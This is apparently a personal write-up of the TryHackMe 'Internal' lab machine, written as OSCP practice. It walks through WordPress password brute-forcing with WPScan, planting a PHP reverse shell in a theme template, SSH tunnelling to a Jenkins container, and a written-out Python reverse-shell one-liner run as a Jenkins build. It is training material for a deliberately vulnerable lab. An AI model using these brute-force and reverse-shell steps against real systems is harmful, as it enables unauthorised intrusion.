[Internal](https://tryhackme.com/room/internal) is the last machine in the "Advanced Exploitation" part of  TryHackMe's "Offensive pentesting" path.

## Enumeration

As I'm starting to prepare for my "Dry run" for the `OSCP` exam,  this time I will use more stuff from my methodology.  
We already learned that enumeration is crucial, right? So why would you leave a chance to mess it up, if you have more automated tools?  
Today I would use [Autorecon](https://github.com/Tib3rius/AutoRecon) for my initial enumeration.  
The syntax is simple:

```
autorecon <target_ip>
```
The tool will generate a bunch of scans and put all the results in a folder. Easy to follow up, easy to keep notes.  
Navigate to the `results/<target_ip>/report/notes.txt` and you will see all open ports:

```
[*] ssh found on tcp/22.



[*] http found on tcp/80.


```
You can keep track of your actions for each port right here.  
Secondly, `results/<target_ip>/scans/` folder contains all the fun stuff. If the tool will pick up a port, let's say port `80`, it will automatically start a sub-scan for tools like `nikto`,`gobuster`, etc.  
You will still need to analyze all of that stuff and maybe repeat some `gobuster` scans for subfolders, but just by using this tool, you increase your chance to find juicy stuff on your target.  
You might also like to use the `Sparta` for that, but I like the `Autorecon` a bit more.

## Exploitation

So, `Autorecon` picked up that there is a folder `/blog` on port `80`. You can see that the `WordPress` is running there, navigate to the panel, and try to login with something trivial as `admin:admin`.  

> internal.thm need to be added to the `/etc/hosts`

You will get the error message `Error: The password you entered for the username admin is incorrect.`.  
Now we know that the `admin` is a correct username, but the password is wrong.  
Let's use the `WPScan` to learn more about this setup and bruteforce the password:

```
wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

```
After a while the `WPScan` will wind the correct password for you:
```
[!] Valid Combinations Found:
 | Username: admin, Password: <redacted>
```
A standard way is to navigate to the `Theme editor`, and add a `php-reverse-shell` instead of one of the pages in a template.  
I usually go for `404.php` as it easy to trigger.  
You can grab your template for a reverse shell from [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Don't forget to change your IP and port.  

If you're placing your shell instead of `404.php` page, you can trigger it by opening a page on the server that doesn't exist.
```
http://internal.thm/blog/index.php/41414141/
```

Catch the shell with the `nc`.

You can find the username `aubreanna` in the `/home` directory, but you can't access it yet.  
Let's look around.  

If you're stuck, check interesting directories like `/var/backups`, `/tmp`, `/opt`, etc. and check is there anything that stood out.  
The `/opt` directory in our case contains the file `wp-save.txt`:

```
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:<reducted>
```

Now we can `ssh` to the box as user `aubreanna`:

```
ssh aubreanna@<target_ip>
```

Let's check what we have in the `/home` directory:
```
/home/aubreanna# ls
jenkins.txt  snap  user.txt
```

---

## PrivEsc

To PrivEsc here we need to enumerate a bit more:

```
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

IP looks weird, it's different from the `<target_ip>`.

```
ip a

3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:a7:d9:5d:ec brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a7ff:fed9:5dec/64 scope link
       valid_lft forever preferred_lft forever
```

Now we know that we are dealing with the `Docker` container with `Jenkins` inside.

To access it we can use `ssh-tunneling`:

```
ssh -L 8080:172.17.0.2:8080 aubreanna@<target_ip>
```

Now you can open `localhost:8080` in your browser and get access to the `Jenkins` login page.  
We don't have any credentials that will work here, so let's try a bruteforcing again.  

This time I will use `TurboIntruder` - the extension for the `Burp Suite`.
You can read more about it [here](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack).
I used `basic.py` script for the `TurboIntruder` and the `rockyou.txt` as a wordlist.  

You will find the password in less than a minute. You can say that by sorting the `Length` tab and finding the lowest size of the response.

Now you have access to `Jenkins`!

You can create the new `Build` and choose `Execute shell` in the options.  
I used the `python` reverse shell from `PentestMonkey` as a parameter:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Click `Build now` and catch your shell with the `nc`.  

```
jenkins@jenkins:/opt$ whoami
jenkins

jenkins@jenkins:/opt$ uname -a
Linux jenkins 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 GNU/Linux
```

We are within a `Docker` container now. Let's look around.

Frankly speaking, I expected to see something from [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) as a way to escape from the container, but the solution was way more simple.  
```
jenkins@jenkins:~$ cd /opt
jenkins@jenkins:/opt$ ls
note.txt
jenkins@jenkins:/opt$ cat note.txt

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:<redacted>
```

Now you can `su` from the main box to the `root` user.

## Takeaway
- Sometimes, you feel that the solution is so easy, so you stumble the fact that each system could be different. Do not assume anything. Even the path that you followed 100 times before might not work out on 101st.  
- You can't rely on your enumeration tools 100% of the time, those `.txt` notes would be found by most of them
